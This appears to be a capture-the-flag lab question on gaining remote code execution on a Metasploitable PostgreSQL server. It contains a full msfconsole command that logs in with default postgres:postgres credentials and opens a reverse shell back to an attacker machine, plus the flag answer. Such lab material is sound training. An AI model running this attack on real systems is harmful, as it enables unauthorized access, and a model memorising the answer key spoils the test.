# Q049 — PostgreSQL Auth RCE

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use `exploit/linux/postgres/postgres_payload` against Metasploitable postgres:postgres. Report payload type used.

---

## 🎯 Flag Format

```
payload=<type>
```

Example: `payload=linux/x86/shell_reverse_tcp`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Default payload works.
</details>

<details>
<summary>Hint 2</summary>

Verify via `getuid` (postgres user).
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/linux/postgres/postgres_payload; set RHOSTS 192.168.52.129; set USERNAME postgres; set PASSWORD postgres; set LHOST 192.168.52.128; run'
```

Yields postgres-user shell.

**Answer:** `payload=linux/x86/shell_reverse_tcp`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q049".
```
